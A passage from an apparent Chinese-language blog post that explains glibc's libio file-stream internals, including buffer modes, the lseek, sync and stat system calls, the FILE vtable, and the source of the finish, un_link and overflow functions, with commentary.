class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* An fstream can be in at most one of put mode, get mode, or putback mode.</span></span><br><span class="line"><span class="comment">   Putback mode is a variant of get mode.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   In a filebuf, there is only one current position, instead of two</span></span><br><span class="line"><span class="comment">   separate get and put pointers.  In get mode, the current position</span></span><br><span class="line"><span class="comment">   is that of gptr(); in put mode that of pptr().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The position in the buffer that corresponds to the position</span></span><br><span class="line"><span class="comment">   in external file system is normally _IO_read_end, except in putback</span></span><br><span class="line"><span class="comment">   mode, when it is _IO_save_end and also when the file is in append mode,</span></span><br><span class="line"><span class="comment">   since switching from read to write mode automatically sends the position in</span></span><br><span class="line"><span class="comment">   the external file system to the end of file.</span></span><br><span class="line"><span class="comment">   If the field _fb._offset is &gt;= 0, it gives the offset in</span></span><br><span class="line"><span class="comment">   the file as a whole corresponding to eGptr(). (?)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   PUT MODE:</span></span><br><span class="line"><span class="comment">   If a filebuf is in put mode, then all of _IO_read_ptr, _IO_read_end,</span></span><br><span class="line"><span class="comment">   and _IO_read_base are equal to each other.  These are usually equal</span></span><br><span class="line"><span class="comment">   to _IO_buf_base, though not necessarily if we have switched from</span></span><br><span class="line"><span class="comment">   get mode to put mode.  (The reason is to maintain the invariant</span></span><br><span class="line"><span class="comment">   that _IO_read_end corresponds to the external file position.)</span></span><br><span class="line"><span class="comment">   _IO_write_base is non-NULL and usually equal to _IO_buf_base.</span></span><br><span class="line"><span class="comment">   We also have _IO_write_end == _IO_buf_end, but only in fully buffered mode.</span></span><br><span class="line"><span class="comment">   The un-flushed character are those between _IO_write_base and _IO_write_ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   GET MODE:</span></span><br><span class="line"><span class="comment">   If a filebuf is in get or putback mode, eback() != egptr().</span></span><br><span class="line"><span class="comment">   In get mode, the unread characters are between gptr() and egptr().</span></span><br><span class="line"><span class="comment">   The OS file position corresponds to that of egptr().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   PUTBACK MODE:</span></span><br><span class="line"><span class="comment">   Putback mode is used to remember &quot;excess&quot; characters that have</span></span><br><span class="line"><span class="comment">   been sputbackc&#x27;d in a separate putback buffer.</span></span><br><span class="line"><span class="comment">   In putback mode, the get buffer points to the special putback buffer.</span></span><br><span class="line"><span class="comment">   The unread characters are the characters between gptr() and egptr()</span></span><br><span class="line"><span class="comment">   in the putback buffer, as well as the area between save_gptr()</span></span><br><span class="line"><span class="comment">   and save_egptr(), which point into the original reserve buffer.</span></span><br><span class="line"><span class="comment">   (The pointers save_gptr() and save_egptr() are the values</span></span><br><span class="line"><span class="comment">   of gptr() and egptr() at the time putback mode was entered.)</span></span><br><span class="line"><span class="comment">   The OS position corresponds to that of save_egptr().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   LINE BUFFERED OUTPUT:</span></span><br><span class="line"><span class="comment">   During line buffered output, _IO_write_base==base() &amp;&amp; epptr()==base().</span></span><br><span class="line"><span class="comment">   However, ptr() may be anywhere between base() and ebuf().</span></span><br><span class="line"><span class="comment">   This forces a call to filebuf::overflow(int C) on every put.</span></span><br><span class="line"><span class="comment">   If there is more space in the buffer, and C is not a &#x27;\n&#x27;,</span></span><br><span class="line"><span class="comment">   then C is inserted, and pptr() incremented.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   UNBUFFERED STREAMS:</span></span><br><span class="line"><span class="comment">   If a filebuf is unbuffered(), the _shortbuf[1] is used as the buffer.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>大致如下</p><ol><li><strong>文件流的模式</strong>：文件流可以处于put模式、get模式或putback模式中。Putback模式是get模式的一种变体。</li><li><strong>文件缓冲区中的当前位置</strong>：在文件缓冲区中，<strong>只有一个当前位置</strong>，而不是分别有get指针和put指针。在get模式中，当前位置是gptr()的位置；在put模式中，当前位置是pptr()的位置。</li><li><strong>缓冲区位置与外部文件系统位置的对应</strong>：通常情况下，缓冲区中与外部文件系统位置对应的位置是_IO_read_end，但在putback模式下，它是_IO_save_end，并且在文件处于附加模式时也是_IO_save_end。这是因为从读模式切换到写模式会自动将外部文件系统位置切换到文件的末尾。如果字段_fb._offset &gt;= 0，则它表示与eGptr()对应的文件整体偏移。</li><li><strong>PUT模式</strong>：在put模式下，_IO_read_ptr、_IO_read_end和_IO_read_base都相等。它们通常等于_IO_buf_base，但如果从get模式切换到put模式，它们不一定相等。_IO_write_base不为空，通常等于_IO_buf_base。_IO_write_end等于_IO_buf_end，但<strong>只在完全缓冲模式下成立</strong>。<u>未刷新的字符位于_IO_write_base和_IO_write_ptr之间。</u></li><li><strong>GET模式</strong>：在get或putback模式下，eback() != egptr()。在get模式中，<u>未读字符位于gptr()和egptr()之间</u>。操作系统文件位置对应于egptr()的位置。</li><li><strong>PUTBACK模式</strong>：putback模式用于记住已经通过sputbackc放回的“多余”字符，它们存储在特殊的putback缓冲区中。在putback模式中，get缓冲区指向特殊的putback缓冲区。未读字符包括putback缓冲区中gptr()和egptr()之间的字符，以及指向原始预留缓冲区的save_gptr()和save_egptr()之间的区域。操作系统位置对应于save_egptr()的位置。</li><li><strong>行缓冲输出</strong>：在行缓冲输出期间，_IO_write_base等于base()，<strong>并且epptr()也等于base()</strong>。但是，ptr()可能位于base()和ebuf()之间。这会导致在<strong>每次放入字符时调用</strong>filebuf::overflow(int C)。如果缓冲区中还有更多空间(pptr&lt;ebuf)，并且C不是’\n’，则会插入C，并增加pptr(),否则刷新写入。</li><li><strong>无缓冲流</strong>：如果文件缓冲区是unbuffered()，则_shortbuf[1]用作缓冲区。</li></ol><h1 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h1><h2 id="lseek"><a href="#lseek" class="headerlink" title="lseek"></a>lseek</h2><p><code>seek</code> 是一个用于文件操作的系统调用，它的主要功能是用于改变文件指针的位置，从而实现对文件的随机访问。具体来说，<code>seek</code> 的功能包括：</p><ol><li>定位文件指针：<code>seek</code> 允许你将文件指针（读/写位置）移动到文件中的任意位置。这是对文件进行随机访问的关键操作。你可以指定要移动到的位置，通常是相对于文件开头的偏移量。</li><li>读取和写入特定位置：通过改变文件指针的位置，你可以在文件中的任何位置进行读取和写入操作，而不必按照顺序逐个字节进行操作。这对于访问大型文件或数据库非常有用。</li><li>支持文件的随机访问：<code>seek</code> 是实现随机访问的关键，允许你在不必按照文件顺序读取数据的情况下，快速访问和处理文件的各个部分。</li><li>实现文件的截断和扩展：在某些情况下，<code>seek</code> 可以用于截断文件（减小文件大小）或扩展文件（增大文件大小）。通过移动文件指针并写入数据，你可以实现这些操作。</li></ol><p>其返回值表示成功执行操作后的文件偏移量，如果出现错误，返回值会是 <code>-1</code>。</p><p>具体来说，<code>lseek</code> 的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off_t</span> <span class="title function_">lseek</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> offset, <span class="type">int</span> whence)</span>;</span><br></pre></td></tr></table></figure><ul><li><code>fd</code> 是文件描述符，用于指定要进行定位操作的文件。</li><li><code>offset</code> 是一个偏移量，用于指定要移动的相对位置。可以为正数、负数或零，具体取决于 <code>whence</code> 参数的值。</li><li><code>whence</code> 用于确定偏移量的基准位置，通常可以取以下值之一：<ul><li><code>SEEK_SET</code>：以文件开头为基准，<code>offset</code> 指定的位置。</li><li><code>SEEK_CUR</code>：以当前文件位置为基准，增加 <code>offset</code> 指定的位置。</li><li><code>SEEK_END</code>：以文件末尾为基准，增加 <code>offset</code> 指定的位置。</li></ul></li></ul><p><code>lseek</code> 函数会根据 <code>offset</code> 和 <code>whence</code> 的指定值来移动文件描述符 <code>fd</code> 的偏移位置，并返回新的文件偏移位置。如果操作成功，返回值是新的偏移位置。如果出现错误，返回值是 <code>-1</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_seek_set 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_seek_cur 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_seek_end 2</span></span><br></pre></td></tr></table></figure><h2 id="sync"><a href="#sync" class="headerlink" title="sync"></a>sync</h2><p><code>sync</code> 是一个系统调用，它的主要功能是将操作系统内核中尚未写入磁盘的缓冲区数据强制刷新到磁盘上的存储设备，<strong>以确保数据持久性和文件系统的一致性</strong>。<code>sync</code> 的主要功能包括：</p><ol><li>数据持久性：通过执行 <code>sync</code>，操作系统会将所有尚未写入磁盘的数据写入到物理存储设备中。这可以确保即使系统崩溃或断电，尚未写入磁盘的数据也不会丢失。</li><li>文件系统一致性：<code>sync</code> 也有助于维护文件系统的一致性。在写入文件和目录信息时，文件系统通常会维护内部数据结构，这些数据结构需要及时写入磁盘以确保文件系统的一致性。<code>sync</code> 确保这些数据结构及其相关的数据被写入磁盘。</li><li>缓冲区刷新：<code>sync</code> 还用于刷新内核中的缓冲区，以确保缓冲区中的数据被写入磁盘。这对于正在进行的文件操作和文件系统操作非常重要，因为数据通常首先存储在内存中以提高性能，然后定期刷新到磁盘上。</li><li>数据完整性：<code>sync</code> 还有助于维护数据的完整性。它确保了所有写入的数据都已经被持久地存储在磁盘上，以免数据损坏或丢失。</li></ol><h2 id="stat"><a href="#stat" class="headerlink" title="stat"></a>stat</h2><p>系统调用 <code>stat</code> 用于获取关于文件或目录的信息，如文件的大小、访问权限、所属用户和组、文件类型等。它<strong>返回一个包含文件信息的结构体</strong>，通常被称为 <code>struct stat</code>。</p><p><code>stat</code> 系统调用的功能包括：</p><ol><li><p>获取文件的基本属性：<code>stat</code> 可以用来获取文件的基本属性，如文件大小、创建时间、修改时间、访问时间等。</p></li><li><p>获取文件的权限信息：<code>stat</code> 可以提供文件的权限信息，包括文件的拥有者、所属组以及其他用户的权限。</p></li><li><p>确定文件的类型：<code>stat</code> 可以告诉您文件是普通文件、目录、符号链接还是其他类型的文件。</p></li><li><p>获取文件的相关信息：<code>stat</code> 可以提供有关文件系统的信息，如文件系统的块大小、设备号等。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">stat64</span> &#123;</span></span><br><span class="line">  <span class="type">_dev_t</span> st_dev;<span class="comment">//文件所在的设备的标识符</span></span><br><span class="line">  <span class="type">_ino_t</span> st_ino;<span class="comment">//文件的 inode 号</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> st_mode;<span class="comment">//文件的权限和类型信息</span></span><br><span class="line">  <span class="type">short</span> st_nlink;<span class="comment">//文件的硬链接数目</span></span><br><span class="line">  <span class="type">short</span> st_uid;<span class="comment">//文件的用户标识符 (UID)</span></span><br><span class="line">  <span class="type">short</span> st_gid;<span class="comment">//文件的组标识符 (GID)</span></span><br><span class="line">  <span class="type">_dev_t</span> st_rdev;<span class="comment">//特殊文件的设备标识符</span></span><br><span class="line">  __MINGW_EXTENSION __int64 st_size;<span class="comment">//文件的大小，以字节为单位</span></span><br><span class="line">  <span class="type">__time64_t</span> st_atime;<span class="comment">//最后访问时间</span></span><br><span class="line">  <span class="type">__time64_t</span> st_mtime;<span class="comment">//最后修改时间</span></span><br><span class="line">  <span class="type">__time64_t</span> st_ctime;<span class="comment">//状态改变时间</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其他还有用到read,write,open,close都较为熟悉就不记录了</p><h1 id="IO虚表函数"><a href="#IO虚表函数" class="headerlink" title="IO虚表函数"></a>IO虚表函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_file_jumps)</span><br></pre></td></tr></table></figure><h2 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h2><p>finish的主要功能是关闭缓冲区,解除文件流在_IO_list_all中的链接</p><h3 id="1-IO-new-file-finish"><a href="#1-IO-new-file-finish" class="headerlink" title="1 _IO_new_file_finish"></a>1 _IO_new_file_finish</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">_IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)</span><br></pre></td></tr></table></figure><ol><li>先是检查文件是否打开,是则调用_IO_do_flush (fp)并根据 _IO_DELETE_DONT_CLOSE标志位决定是否调用close关闭文件流</li><li>_IO_default_finish (fp, 0);</li></ol><h3 id="2-1-IO-do-flush"><a href="#2-1-IO-do-flush" class="headerlink" title="2-1 _IO_do_flush"></a>2-1 _IO_do_flush</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0      \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">  (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)      \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,      \</span></span><br><span class="line"><span class="meta">   ((_f)-&gt;_wide_data-&gt;_IO_write_ptr      \</span></span><br><span class="line"><span class="meta">    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><p>根据是是否是宽字节有两个分支</p><p>目前先看非宽字节分支,调用的是另一个虚表函数write,这里先不写</p><h3 id="2-2-IO-default-finish"><a href="#2-2-IO-default-finish" class="headerlink" title="2-2 _IO_default_finish"></a>2-2 _IO_default_finish</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_finish)</span><br></pre></td></tr></table></figure><ol><li>若buf不为空且_IO_USER_BUF标志为0,释放free缓冲区,并置空buf指针</li><li>将文件流的所有marker的_sbuf字段清空</li><li>若文件流的_IO_save_base不为空,则将其free释放并置空</li><li>调用unlink将文件流解除_IO_list_all链</li></ol><h3 id="3-IO-un-link"><a href="#3-IO-un-link" class="headerlink" title="3 _IO_un_link"></a>3 _IO_un_link</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      FILE **f;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">_IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>先确认文件流在_IO_list_all链中</li><li>寻找_IO_list_all链中的fp将其解链并清除_IO_LINKED标志位</li></ol><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p><code>overflow</code> 主要负责将数据写入底层文件(或设备)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment"> If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment"> logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment"> read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment"> makes room for subsequent output.</span></span><br><span class="line"><span class="comment"> Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment"> alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; 